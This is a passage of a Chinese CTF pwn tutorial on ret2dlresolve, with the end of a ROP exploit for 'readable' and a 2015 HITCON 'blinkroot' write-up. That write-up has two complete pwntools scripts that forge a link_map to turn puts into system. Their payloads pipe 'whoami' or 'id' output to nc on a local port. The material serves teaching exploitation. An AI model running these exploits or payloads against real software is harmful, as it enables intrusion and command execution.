            <span class=n>data</span> <span class=o>=</span> <span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=n>timeout</span><span class=o>=</span><span class=mf>0.5</span><span class=p>)</span>
            <span class=k>if</span> <span class=n>data</span> <span class=o>==</span> <span class=s2>&quot;</span><span class=se>\x7F</span><span class=s2>ELF&quot;</span><span class=p>:</span>
                <span class=nb>print</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>i</span><span class=p>),</span> <span class=n>data</span><span class=p>)</span>
        <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
            <span class=k>pass</span>
        <span class=n>io</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>


<span class=k>def</span> <span class=nf>exp</span><span class=p>():</span>
    <span class=n>rop_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>bss</span><span class=p>()</span>
    <span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&quot;./readable&quot;</span><span class=p>)</span>
    <span class=n>execve_number</span> <span class=o>=</span> <span class=mi>59</span>
    <span class=n>bin_sh_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s2>&quot;read&quot;</span><span class=p>]</span><span class=o>-</span><span class=n>execve_number</span><span class=o>+</span><span class=mi>1</span>
    <span class=c1># modify the last byte of read&#39;s got</span>
    <span class=n>payload</span> <span class=o>=</span> <span class=n>csu_gadget</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s2>&quot;read&quot;</span><span class=p>],</span> <span class=n>execve_number</span><span class=p>,</span> <span class=n>bin_sh_addr</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
    <span class=c1># jump to read again, execve(&quot;/bin/sh\x00&quot;)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>csu_gadget</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s2>&quot;read&quot;</span><span class=p>],</span>
                          <span class=n>bin_sh_addr</span><span class=o>+</span><span class=mi>8</span><span class=p>,</span> <span class=n>bin_sh_addr</span><span class=o>+</span><span class=mi>8</span><span class=p>,</span> <span class=n>bin_sh_addr</span><span class=p>)</span>
    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>),</span> <span class=mi>16</span><span class=p>):</span>
        <span class=n>tmp</span> <span class=o>=</span> <span class=n>read16bytes</span><span class=p>(</span><span class=n>rop_addr</span><span class=o>+</span><span class=n>j</span><span class=p>,</span> <span class=n>payload</span><span class=p>[</span><span class=n>j</span><span class=p>:</span><span class=n>j</span><span class=o>+</span><span class=mi>16</span><span class=p>])</span>
        <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>tmp</span><span class=p>)</span>
    <span class=c1># jump to the rop</span>
    <span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>16</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rop_addr</span><span class=o>-</span><span class=mi>8</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x400520</span><span class=p>)</span>  <span class=c1># leave ret</span>
    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>

    <span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;/bin/sh&#39;</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=n>execve_number</span><span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span><span class=o>+</span><span class=n>p8</span><span class=p>(</span><span class=mh>0xc2</span><span class=p>)</span>
    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
    <span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>


<span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&quot;__main__&quot;</span><span class=p>:</span>
    <span class=c1># bruteforce()</span>
    <span class=n>exp</span><span class=p>()</span>
</code></pre></div> <h2 id=2015-hitcon-quals-blinkroot>2015-hitcon-quals-blinkroot<a class=headerlink href=#2015-hitcon-quals-blinkroot title="Permanent link">&para;</a></h2> <p>简单看一下程序开的保护</p> <div class=highlight><pre><span></span><code>❯ checksec blinkroot
<span class=o>[</span>*<span class=o>]</span> <span class=s1>&#39;/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-hitcon-quals-blinkroot/blinkroot&#39;</span>
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE <span class=o>(</span>0x400000<span class=o>)</span>
</code></pre></div> <p>发现程序开启了 Canary 保护。</p> <p>程序的基本逻辑为</p> <ul> <li>在 bss 指定位置处读取 1024 个字节</li> <li>关闭标准输入，标准输出，标准错误输出。</li> <li>然后可以在任意 16 字节对齐地址处设置16个字节，其中低8字节固定为 0x10，高 8 字节完全可控。</li> </ul> <p>显然这里是没有信息泄露的，当然我们没有办法覆盖返回地址来控制程序的执行流。但是既然程序没有开启 RELRO 保护，我们可以考虑修改 ELF 文件的字符串表。同时我们观察到</p> <div class=highlight><pre><span></span><code><span class=kt>int</span> <span class=kr>__cdecl</span> <span class=n>__noreturn</span> <span class=n>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>envp</span><span class=p>)</span>
<span class=p>{</span>
  <span class=k>if</span> <span class=p>(</span> <span class=n>recvlen</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>data</span><span class=p>,</span> <span class=mh>0x400uLL</span><span class=p>)</span> <span class=o>==</span> <span class=mi>1024</span> <span class=p>)</span>
  <span class=p>{</span>
    <span class=n>close</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
    <span class=n>close</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
    <span class=n>close</span><span class=p>(</span><span class=mi>2</span><span class=p>);</span>
    <span class=o>*</span><span class=p>(</span><span class=kr>__m128</span> <span class=o>*</span><span class=p>)((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>data</span> <span class=o>+</span> <span class=n>data</span><span class=p>)</span> <span class=o>=</span> <span class=n>_mm_loadh_ps</span><span class=p>(</span><span class=o>&amp;</span><span class=n>dbl_600BC8</span><span class=p>);</span>
    <span class=n>puts</span><span class=p>(</span><span class=n>s</span><span class=p>);</span>
  <span class=p>}</span>
  <span class=n>_exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
<span class=p>}</span>
</code></pre></div> <p>程序会执行 puts 函数，而 puts 函数的具体地址为 data 变量偏移 0x10。</p> <div class=highlight><pre><span></span><code>.bss:0000000000600BC0                 public data
.bss:0000000000600BC0 data            dq ?                    ; DATA XREF: main+B↑o
.bss:0000000000600BC0                                         ; main+4D↑r ...
.bss:0000000000600BC8 ; double dbl_600BC8
.bss:0000000000600BC8 dbl_600BC8      dq ?                    ; DATA XREF: main+5C↑o
.bss:0000000000600BD0 ; char s[1008]
.bss:0000000000600BD0 s               db 3F0h dup(?)          ; DATA XREF: main+72↑o
.bss:0000000000600BD0 _bss            ends
</code></pre></div> <p>因此，我们可以控制 s 为 /bin/sh，同时控制字符串表中的 puts 函数为 system 函数，那就可以调用 system 函数了。然而，理想很好，但是，我们发现</p> <div class=highlight><pre><span></span><code>LOAD:00000000006009E8                 Elf64_Dyn &lt;5, 400340h&gt;  ; DT_STRTAB
LOAD:00000000006009F8                 Elf64_Dyn &lt;6, 400280h&gt;  ; DT_SYMTAB
LOAD:0000000000600A08                 Elf64_Dyn &lt;0Ah, 69h&gt;    ; DT_STRSZ
</code></pre></div> <p>字符串表并不是 16 字节对齐的，因此不太行。那我们尝试使用在开启 Partial RELRO 下的思路吧。</p> <p>由于不能泄露地址信息，所以我们可以采用伪造 linkmap 的思路，即</p> <ul> <li>利用题目提供的任意写的思路修改 linkmap 指向已经解析的地址</li> <li>通过题目中接下来将要调用的 puts 函数来实现劫持控制流的目的</li> </ul> <p>这里我们可以发现 linkmap 存储的地址为 0x600B48，因此我们可以从 0x600B40 开始设置数据。</p> <div class=highlight><pre><span></span><code>.got.plt:0000000000600B40 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC
.got.plt:0000000000600B48 qword_600B48    dq 0                    ; DATA XREF: sub_4004D0↑r
</code></pre></div> <p>此外，需要注意的是 puts 函数在重定位表中的索引为 1。因此，在构造 linkmap 时需要注意。</p> <div class=highlight><pre><span></span><code>.plt:00000000004004F0 ; int puts(const char *s)
.plt:00000000004004F0 _puts           proc near               ; CODE XREF: main+77↓p
.plt:00000000004004F0                 jmp     cs:off_600B60
.plt:00000000004004F0 _puts           endp
.plt:00000000004004F0
.plt:00000000004004F6 ; ---------------------------------------------------------------------------
.plt:00000000004004F6                 push    1
.plt:00000000004004FB                 jmp     sub_4004D0
</code></pre></div> <p>利用脚本如下</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
<span class=n>context</span><span class=o>.</span><span class=n>terminal</span><span class=o>=</span><span class=p>[</span><span class=s2>&quot;tmux&quot;</span><span class=p>,</span><span class=s2>&quot;splitw&quot;</span><span class=p>,</span><span class=s2>&quot;-h&quot;</span><span class=p>]</span>
<span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&quot;blinkroot&quot;</span><span class=p>)</span>
<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&quot;blinkroot&quot;</span><span class=p>)</span>
<span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&quot;./libc.so.6&quot;</span><span class=p>)</span>

<span class=k>def</span> <span class=nf>ret2dlresolve_with_fakelinkmap_x64</span><span class=p>(</span><span class=n>elf</span><span class=p>,</span> <span class=n>fake_linkmap_addr</span><span class=p>,</span> <span class=n>known_function_ptr</span><span class=p>,</span> <span class=n>offset_of_two_addr</span><span class=p>):</span>
    <span class=sd>&#39;&#39;&#39;</span>
<span class=sd>    elf: is the ELF object</span>

<span class=sd>    fake_linkmap_addr: the address of the fake linkmap</span>

<span class=sd>    known_function_ptr: a already known pointer of the function, e.g., elf.got[&#39;__libc_start_main&#39;]</span>

<span class=sd>    offset_of_two_addr: target_function_addr - *(known_function_ptr), where</span>
<span class=sd>                        target_function_addr is the function you want to execute</span>

<span class=sd>    WARNING: assert *(known_function_ptr-8) &amp; 0x0000030000000000 != 0 as ELF64_ST_VISIBILITY(o) = o &amp; 0x3</span>

<span class=sd>    WARNING: be careful that fake_linkmap is 0x100 bytes length   </span>

<span class=sd>    we will do _dl_runtime_resolve(linkmap,reloc_arg) where reloc_arg=1</span>

<span class=sd>    linkmap:</span>
<span class=sd>        0x00: l_addr = offset_of_two_addr</span>
<span class=sd>      fake_DT_JMPREL entry, addr = fake_linkmap_addr + 0x8</span>
<span class=sd>        0x08: 17, tag of the JMPREL</span>
<span class=sd>        0x10: fake_linkmap_addr + 0x18, pointer of the fake JMPREL</span>
<span class=sd>      fake_JMPREL, addr = fake_linkmap_addr + 0x18</span>
<span class=sd>        0x18: padding for the relocation entry of idx=0</span>
<span class=sd>        0x20: padding for the relocation entry of idx=0</span>
<span class=sd>        0x28: padding for the relocation entry of idx=0</span>
<span class=sd>        0x30: p_r_offset, offset pointer to the resloved addr</span>
<span class=sd>        0x38: r_info</span>
<span class=sd>        0x40: append    </span>
<span class=sd>      resolved addr</span>
<span class=sd>        0x48: r_offset</span>
<span class=sd>      fake_DT_SYMTAB, addr = fake_linkmap_addr + 0x50</span>
<span class=sd>        0x50: 6, tag of the DT_SYMTAB</span>
<span class=sd>        0x58: known_function_ptr-8, p_fake_symbol_table; here we can still use the fake r_info to set the index of symbol to 0</span>
<span class=sd>      P_DT_STRTAB, pointer for DT_STRTAB</span>
<span class=sd>        0x68: fake a pointer, e.g., fake_linkmap_addr</span>
<span class=sd>      p_DT_SYMTAB, pointer for fake_DT_SYMTAB</span>
<span class=sd>        0x70: fake_linkmap_addr + 0x50</span>
<span class=sd>      p_DT_JMPREL, pointer for fake_DT_JMPREL</span>
<span class=sd>        0xf8: fake_linkmap_addr + 0x8</span>
<span class=sd>    &#39;&#39;&#39;</span>
    <span class=n>plt0</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>

    <span class=n>linkmap</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>offset_of_two_addr</span> <span class=o>&amp;</span> <span class=p>(</span><span class=mi>2</span><span class=o>**</span><span class=mi>64</span> <span class=o>-</span> <span class=mi>1</span><span class=p>))</span>
    <span class=n>linkmap</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>17</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_linkmap_addr</span> <span class=o>+</span> <span class=mh>0x18</span><span class=p>)</span>
    <span class=n>linkmap</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>3</span>
    <span class=c1># here we set p_r_offset = fake_linkmap_addr + 0x48 - two_offset</span>
    <span class=c1># as void *const rel_addr = (void *)(l-&gt;l_addr + reloc-&gt;r_offset) and l-&gt;l_addr = offset_of_two_addr</span>
    <span class=n>linkmap</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>((</span><span class=n>fake_linkmap_addr</span> <span class=o>+</span> <span class=mh>0x48</span> <span class=o>-</span> <span class=n>offset_of_two_addr</span><span class=p>)</span>
                   <span class=o>&amp;</span> <span class=p>(</span><span class=mi>2</span><span class=o>**</span><span class=mi>64</span> <span class=o>-</span> <span class=mi>1</span><span class=p>))</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x7</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
    <span class=n>linkmap</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
    <span class=n>linkmap</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>known_function_ptr</span><span class=o>-</span><span class=mi>8</span><span class=p>)</span>

    <span class=n>linkmap</span> <span class=o>=</span> <span class=n>linkmap</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x68</span><span class=p>,</span> <span class=s1>&#39;A&#39;</span><span class=p>)</span>

    <span class=n>linkmap</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_linkmap_addr</span><span class=p>)</span>

    <span class=n>linkmap</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_linkmap_addr</span> <span class=o>+</span> <span class=mh>0x50</span><span class=p>)</span>

    <span class=n>linkmap</span> <span class=o>=</span> <span class=n>linkmap</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0xf8</span><span class=p>,</span> <span class=s1>&#39;A&#39;</span><span class=p>)</span>
    <span class=n>linkmap</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_linkmap_addr</span> <span class=o>+</span> <span class=mi>8</span><span class=p>)</span>

    <span class=k>return</span> <span class=n>linkmap</span>

<span class=c1># .got.plt:0000000000600B40 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC</span>
<span class=c1># .got.plt:0000000000600B48 qword_600B48    dq 0    </span>
<span class=n>target_addr</span> <span class=o>=</span> <span class=mh>0x600B40</span>
<span class=n>data_addr</span> <span class=o>=</span> <span class=mh>0x600BC0</span>
<span class=n>offset</span> <span class=o>=</span> <span class=n>target_addr</span><span class=o>-</span><span class=n>data_addr</span>
<span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>offset</span> <span class=o>&amp;</span> <span class=p>(</span><span class=mi>2</span><span class=o>**</span><span class=mi>64</span> <span class=o>-</span> <span class=mi>1</span><span class=p>))</span>
<span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>data_addr</span><span class=o>+</span><span class=mi>43</span><span class=p>)</span>
<span class=n>payload</span> <span class=o>+=</span> <span class=s2>&quot;whoami | nc 127.0.0.1 8080</span><span class=se>\x00</span><span class=s2>&quot;</span>

<span class=n>payload</span> <span class=o>+=</span><span class=n>ret2dlresolve_with_fakelinkmap_x64</span><span class=p>(</span><span class=n>elf</span><span class=p>,</span><span class=n>data_addr</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>),</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s2>&quot;__libc_start_main&quot;</span><span class=p>],</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s2>&quot;system&quot;</span><span class=p>]</span><span class=o>-</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s2>&quot;__libc_start_main&quot;</span><span class=p>])</span>
<span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>1024</span><span class=p>,</span><span class=s1>&#39;A&#39;</span><span class=p>)</span>
<span class=c1># gdb.attach(io)</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
<span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> <p>需要注意这里的 <code>data_addr+43</code> 为伪造的 linkmap 的地址。执行效果如下</p> <div class=highlight><pre><span></span><code>❯ nc -l 127.0.0.1 8080
iromise
</code></pre></div> <p>上面的这种方式为伪造 link_map 的 l_addr 为目标函数和已解析函数之间的偏移。</p> <p>根据之前的介绍，我们还可以伪造 l_addr 为已解析函数的地址， st_value 为已解析函数和目标函数之间的偏移。</p> <div class=highlight><pre><span></span><code>value = l-&gt;l_addr + sym-&gt;st_value
</code></pre></div> <p>这里，由于 <code>.got.plt</code> 的下方没多远就是 bss 段 data 的位置。当我们控制 linkmap 的地址位于 got 表附近时，同时我们还需要利用 link_map 的几个动态表指针，偏移从 0x68 开始。因此我们需要仔细构造对应的数据。这里我们选择伪造 link_map 到 0x600B80。</p> <div class=highlight><pre><span></span><code>0x600B80--&gt;link_map
0x600BC0--&gt;data    
0x600BC8--&gt;data+8
0x600BD0--&gt;data+16, args of puts
0x600BE8--&gt;data+24
</code></pre></div> <p>因此，我们可以控制的 puts 的参数的长度最大为 0x18。</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
<span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&quot;tmux&quot;</span><span class=p>,</span> <span class=s2>&quot;splitw&quot;</span><span class=p>,</span> <span class=s2>&quot;-h&quot;</span><span class=p>]</span>
<span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&quot;blinkroot&quot;</span><span class=p>)</span>
<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&quot;blinkroot&quot;</span><span class=p>)</span>
<span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&quot;./libc.so.6&quot;</span><span class=p>)</span>


<span class=k>def</span> <span class=nf>ret2dlresolve_with_fakelinkmap_x64</span><span class=p>(</span><span class=n>libc</span><span class=p>,</span> <span class=n>fake_linkmap_addr</span><span class=p>,</span> <span class=n>offset_of_two_addr</span><span class=p>):</span>
    <span class=sd>&#39;&#39;&#39;</span>
<span class=sd>    libc: is the ELF object</span>

<span class=sd>    fake_linkmap_addr: the address of the fake linkmap</span>

<span class=sd>    offset_of_two_addr: target_function_addr - *(known_function_ptr), where</span>
<span class=sd>                        target_function_addr is the function you want to execute</span>

<span class=sd>    we will do _dl_runtime_resolve(linkmap,reloc_arg) where reloc_arg=1</span>

<span class=sd>    linkmap:</span>
<span class=sd>      P_DT_STRTAB, pointer for DT_STRTAB</span>
<span class=sd>        0x68: fake a pointer, e.g., fake_linkmap_addr</span>
<span class=sd>      p_DT_SYMTAB, pointer for fake_DT_SYMTAB</span>
<span class=sd>        0x70: fake_linkmap_addr + 0xc0</span>
<span class=sd>      fake_DT_JMPREL entry, addr = fake_linkmap_addr + 0x78</span>
<span class=sd>        0x78: 17, tag of the JMPREL</span>
<span class=sd>        0x80: fake_linkmap_add+0x88, pointer of the fake JMPREL</span>
<span class=sd>      fake_JMPREL, addr = fake_linkmap_addr + 0x88</span>
<span class=sd>        0x88: padding for the relocation entry of idx=0</span>
<span class=sd>        0x90: padding for the relocation entry of idx=0</span>
<span class=sd>        0x98: padding for the relocation entry of idx=0</span>
<span class=sd>        0xa0: p_r_offset, offset pointer to the resloved addr</span>
<span class=sd>        0xa8: r_info</span>
<span class=sd>        0xb0: append</span>
<span class=sd>      resolved addr</span>
<span class=sd>        0xb8: r_offset</span>
<span class=sd>      fake_DT_SYMTAB, addr = fake_linkmap_addr + 0xc0</span>
<span class=sd>        0xc0: 6, tag of the DT_SYMTAB</span>
<span class=sd>        0xc8: p_fake_symbol_table; here we can still use the fake r_info to set the index of symbol to 0</span>
<span class=sd>      fake_SYMTAB, addr = fake_linkmap_addr + 0xd0</span>
<span class=sd>        0xd0: 0x0000030000000000</span>
<span class=sd>        0xd8: offset_of_two_addr</span>
<span class=sd>        0xe0: fake st_size</span>
<span class=sd>      p_DT_JMPREL, pointer for fake_DT_JMPREL</span>
<span class=sd>        0xf8: fake_linkmap_addr + 0x78</span>
<span class=sd>    &#39;&#39;&#39;</span>
    <span class=n>linkmap</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_linkmap_addr</span><span class=p>)</span>
    <span class=n>linkmap</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_linkmap_addr</span><span class=o>+</span><span class=mh>0xc0</span><span class=p>)</span>

    <span class=n>linkmap</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>17</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_linkmap_addr</span> <span class=o>+</span> <span class=mh>0x88</span><span class=p>)</span>
    <span class=n>linkmap</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>3</span>
    <span class=c1># here we set p_r_offset = libc.sym[&quot;__free_hook&quot;]-libc.sym[&quot;__libc_start_main&quot;]</span>
    <span class=c1># as void *const rel_addr = (void *)(l-&gt;l_addr + reloc-&gt;r_offset) and l-&gt;l_addr = __libc_start_main_addr</span>
    <span class=n>linkmap</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>((</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s2>&quot;__free_hook&quot;</span><span class=p>]</span><span class=o>-</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s2>&quot;__libc_start_main&quot;</span><span class=p>])</span> <span class=o>&amp;</span> <span class=p>(</span><span class=mi>2</span><span class=o>**</span><span class=mi>64</span> <span class=o>-</span> <span class=mi>1</span><span class=p>))</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x7</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>

    <span class=n>linkmap</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>

    <span class=n>linkmap</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_linkmap_addr</span> <span class=o>+</span> <span class=mh>0xd0</span><span class=p>)</span>

    <span class=n>linkmap</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x0000030000000000</span><span class=p>)</span> <span class=o>+</span> \
        <span class=n>p64</span><span class=p>(</span><span class=n>offset_of_two_addr</span> <span class=o>&amp;</span> <span class=p>(</span><span class=mi>2</span><span class=o>**</span><span class=mi>64</span> <span class=o>-</span> <span class=mi>1</span><span class=p>))</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>

    <span class=n>linkmap</span> <span class=o>=</span> <span class=n>linkmap</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0xf8</span><span class=o>-</span><span class=mh>0x68</span><span class=p>,</span> <span class=s1>&#39;A&#39;</span><span class=p>)</span>
    <span class=n>linkmap</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_linkmap_addr</span> <span class=o>+</span> <span class=mh>0x78</span><span class=p>)</span>

    <span class=k>return</span> <span class=n>linkmap</span>


<span class=c1># .got.plt:0000000000600B40 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC</span>
<span class=c1># .got.plt:0000000000600B48 qword_600B48    dq 0</span>
<span class=n>target_addr</span> <span class=o>=</span> <span class=mh>0x600B40</span>
<span class=n>data_addr</span> <span class=o>=</span> <span class=mh>0x600BC0</span>
<span class=n>offset</span> <span class=o>=</span> <span class=n>target_addr</span><span class=o>-</span><span class=n>data_addr</span>
<span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>offset</span> <span class=o>&amp;</span> <span class=p>(</span><span class=mi>2</span><span class=o>**</span><span class=mi>64</span> <span class=o>-</span> <span class=mi>1</span><span class=p>))</span>
<span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s2>&quot;__libc_start_main&quot;</span><span class=p>])</span>
<span class=n>payload</span> <span class=o>+=</span> <span class=s2>&quot;id|nc 127.0.0.1 8080</span><span class=se>\x00</span><span class=s2>&quot;</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x18</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
<span class=n>payload</span> <span class=o>+=</span> <span class=n>ret2dlresolve_with_fakelinkmap_x64</span><span class=p>(</span><span class=n>libc</span><span class=p>,</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s2>&quot;__libc_start_main&quot;</span><span class=p>],</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s2>&quot;system&quot;</span><span class=p>]</span><span class=o>-</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s2>&quot;__libc_start_main&quot;</span><span class=p>])</span>
<span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>1024</span><span class=p>,</span> <span class=s1>&#39;A&#39;</span><span class=p>)</span>
<span class=c1># gdb.attach(io)</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
<span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> <p>需要注意的是，在伪造 linkmap 的时候，我们是从偏移 0x68 开始构造的，所以在最后对齐的时候设置 <code>linkmap.ljust(0xf8-0x68, 'A')</code>。</p> <p>执行效果</p> <div class=highlight><pre><span></span><code>❯ nc -l <span class=m>127</span>.0.0.1 <span class=m>8080</span>
<span class=nv>uid</span><span class=o>=</span><span class=m>1000</span><span class=o>(</span>iromise<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span><span class=m>1000</span><span class=o>(</span>iromise<span class=o>)</span>...
